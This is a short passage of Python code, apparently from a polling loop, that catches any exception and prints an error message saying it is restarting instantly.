        except Exception as e:
            print(f"❌ [Polling] Error: {e} — restarting instantly...")


